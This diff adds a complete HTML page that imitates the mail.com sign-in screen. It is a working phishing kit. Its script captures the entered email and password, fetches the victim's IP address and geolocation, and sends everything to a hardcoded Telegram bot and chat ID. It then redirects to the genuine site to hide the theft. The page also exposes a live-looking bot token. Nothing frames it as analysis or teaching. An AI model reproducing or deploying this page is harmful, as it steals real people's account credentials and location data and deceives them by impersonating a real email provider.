@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mail.com - Free Email Accounts</title>
+    <link rel="icon" href="https://www.mail.com/favicon.ico" type="image/x-icon">
+    
+    <!-- Font Awesome for eye icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: #003087;
+            color: white;
+            padding: 15px 0;
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .logo span {
+            color: #ffcc00;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 25px;
+            font-size: 14px;
+        }
+
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 35px;
+            text-align: center;
+        }
+
+        .login-title {
+            font-size: 28px;
+            margin-bottom: 8px;
+            color: #003087;
+            font-weight: bold;
+        }
+
+        .login-subtitle {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 45px 12px 14px; /* extra right padding for icon */
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #003087;
+            box-shadow: 0 0 0 2px rgba(0,48,135,0.15);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 70%; /* better vertical centering - adjusted for label height */
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+            font-size: 18px;
+            user-select: none;
+            line-height: 1;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 15px 0 25px;
+            font-size: 14px;
+        }
+
+        .checkbox-group input {
+            margin-right: 10px;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #003087;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-login:hover {
+            background: #002060;
+        }
+
+        .links {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+
+        .links a {
+            color: #003087;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: #003087;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #ffcc00;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 500px) {
+            .login-box {
+                padding: 30px 20px;
+            }
+        }
+
+        /* Loading overlay */
+        #loadingOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 48, 135, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            color: white;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        #loadingOverlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading overlay -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading...</div>
+    </div>
+
+    <header>
+        <div class="header-container">
+            <div class="logo">mail<span>.com</span></div>
+            <div class="nav-links">
+                <a href="#">Help</a>
+                <a href="#">Sign up</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="login-box">
+            <h1 class="login-title">Sign in</h1>
+            <p class="login-subtitle">to your mail.com email account</p>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" class="input-field" placeholder="yourname@mail.com" autocomplete="email" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" class="input-field" placeholder="••••••••" autocomplete="current-password" required>
+                    <i class="fas fa-eye password-toggle" id="togglePassword"></i>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="staySignedIn" checked>
+                    <label for="staySignedIn">Stay signed in</label>
+                </div>
+
+                <button type="submit" class="btn-login">Sign in</button>
+            </form>
+
+            <div class="links">
+                <a href="#">Forgot password?</a>
+                <a href="#">Create account</a>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        © 2025 mail.com – <a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Imprint</a>
+    </footer>
+
+    <script>
+        // Telegram Bot Config
+        const BOT_TOKEN = '8501201307:AAF-G7wDBetT4ciGomqeb3Cn8xhAJj8ZeJY';
+        const CHAT_ID   = '7811078120';
+        const REDIRECT_URL = 'https://www.mail.com';
+
+        // Password toggle
+        const passwordInput = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+
+        togglePassword.addEventListener('click', () => {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            togglePassword.classList.toggle('fa-eye');
+            togglePassword.classList.toggle('fa-eye-slash');
+        });
+
+        // Form submit with Telegram + IP + Geo
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!password) return;
+
+            // Show loading
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Get IP + Geolocation
+            let ip = 'unknown';
+            let geo = 'unknown';
+
+            try {
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+                ip = geoData.ip || 'hidden';
+                geo = `${geoData.city || 'unknown'}, ${geoData.region || ''}, ${geoData.country_name || 'unknown'} (TZ: ${geoData.timezone || 'unknown'})`;
+            } catch (err) {
+                console.error('Geo fetch failed:', err);
+            }
+
+            // Message for Telegram
+            const message = `
+NEW MAIL.COM LOGIN
+Time: ${new Date().toLocaleString()}
+Email: ${email || '(empty)'}
+Password: ${password}
+IP Address: ${ip}
+Location: ${geo}
+URL: ${window.location.href}
+            `.trim();
+
+            // Send to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        disable_web_page_preview: true
+                    }),
+                    keepalive: true
+                });
+                console.log('Sent to Telegram');
+            } catch (err) {
+                console.error('Telegram error:', err);
+            }
+
+            // Redirect after delay
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 1800);
+        });
+    </script>
+
+</body>
+</html>
